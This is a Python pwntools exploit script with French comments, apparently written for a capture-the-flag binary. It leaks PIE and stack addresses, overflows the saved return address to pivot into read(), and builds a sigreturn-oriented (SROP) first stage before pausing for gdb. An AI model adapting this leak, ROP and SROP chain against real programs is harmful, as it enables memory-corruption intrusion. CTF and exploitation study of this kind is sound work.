#!/usr/bin/env python3
# Cet utilitaire de test intermédiaire fait un "core dump": géré en repère.
# Auteur(e) : JG

from pwn import *

context.arch = "amd64"
context.log_level = "info"

exe = ELF("./chall")
context.binary = exe


def leak_pie(io):
    """
    16 ':' -> fuite dans le binaire, on recalcule la base PIE comme avant.
    """
    io.sendlineafter(b">>", b":" * 16)
    io.recvuntil(b":" * 16)
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    base = leak - 0x40a        # même offset que dans ton solver
    exe.address = base
    log.success(f"PIE base  = {hex(base)}")
    return base


def leak_stack(io):
    """
    31 'A' -> fuite d'une adresse sur la stack (comme dans le solver).
    """
    io.sendlineafter(b">>", b"A" * 31)
    io.recvuntil(b"A" * 31 + b"\n")
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    log.success(f"stack leak = {hex(leak)}")
    return leak


def exit_loop_and_return_to_read(io, stack):
    """
    Même pivot que dans ton script inspiré de kiperZ :
      - ROP pour renvoyer l'exécution dans read()
      - second envoi qui met boucle[0] = 0 pour sortir du while
    """
    read_func = exe.address + 0x376   # offset de read() dans le binaire

    # 1er overflow : saved RBP + RIP -> read()
    payload1  = b"A" * 32            # jusqu'à saved rbp
    payload1 += p64(stack - 0x20)    # nouveau rbp
    payload1 += p64(read_func)       # RIP -> read()
    io.sendafter(b">>", payload1)
    log.info("[+] Payload #1 envoyé (RIP -> read())")

    # 2e overflow : on casse la boucle (boucle[0] = 0)
    payload2  = p64(stack - 0x20)    # saved rbp
    payload2 += p32(0x1000)          # padding identique au write-up
    payload2 += p32(0x0)
    payload2 += b"A" * 12            # padding jusqu'à boucle[0]
    payload2 += b"\x00"              # boucle[0] = 0 -> fin de boucle
    io.sendafter(b">>", payload2)
    log.info("[+] Payload #2 envoyé (sortie de boucle)")


def build_stage1(stack):
    """
    1er SROP : rt_sigreturn -> read(0, stack+0x150, 0x800)

    On fait :
      - petit ROP pour mettre rax = 0xf puis syscall
      - SigreturnFrame avec rax=0 (read), rdi=0, rsi=stack+0x150, rdx=0x800
    """
    syscall = exe.address + 0x386
    mov_eax = exe.address + 0x32f
    pop_rbp = exe.address + 0x332

    # ROP pour préparer rt_sigreturn (rax = 0xf)
    chain  = p64(pop_rbp)
    chain += p64(stack)      # nouveau rbp
    chain += p64(mov_eax)    # mov eax,[rbp-8] ; pop rbp ; ret
    chain += b"A" * 8        # pop rbp de mov_eax
    chain += p64(syscall)    # syscall -> rt_sigreturn

    # Frame du sigreturn : read(0, stack+0x150, 0x800)
    frame = SigreturnFrame()
    frame.rax = 0           # read
    frame.rdi = 0           # stdin
    frame.rsi = stack + 0x150
    frame.rdx = 0x800
    frame.rip = syscall     # après sigreturn, on exécute syscall
    frame.rsp = stack + 0x150  # la stack pointera sur la zone où on mettra Stage2

    # endroit que mov_eax va lire : [rbp-8] = 0xf (numéro de syscall rt_sigreturn)
    payload = b"A" * 5 + p64(0xf) + b"A" * 8 + chain + bytes(frame)
    log.info(f"[*] Stage1 length = {len(payload)}")
    return payload


def main():
    io = process(exe.path)
    log.info(f"[PID] chall lancé avec PID = {io.pid}")

    # Fuites
    leak_pie(io)
    stack = leak_stack(io)

    # Pivot & sortie de boucle
    exit_loop_and_return_to_read(io, stack)

    # Envoi du 1er SROP (read vers stack+0x150)
    stage1 = build_stage1(stack)
    io.sendline(stage1)
    log.success("[+] Stage1 envoyé, le process doit maintenant être bloqué dans read()")

    # On garde le process vivant le temps d’attaquer avec gdb
    input(f"[+] Attache gdb avec :  gdb -q -p {io.pid}  puis ENTER ici quand c'est fini...")

    # Pour que le process ne meure pas tout de suite si tu veux continuer à jouer
    io.interactive()


if __name__ == "__main__":
    main()
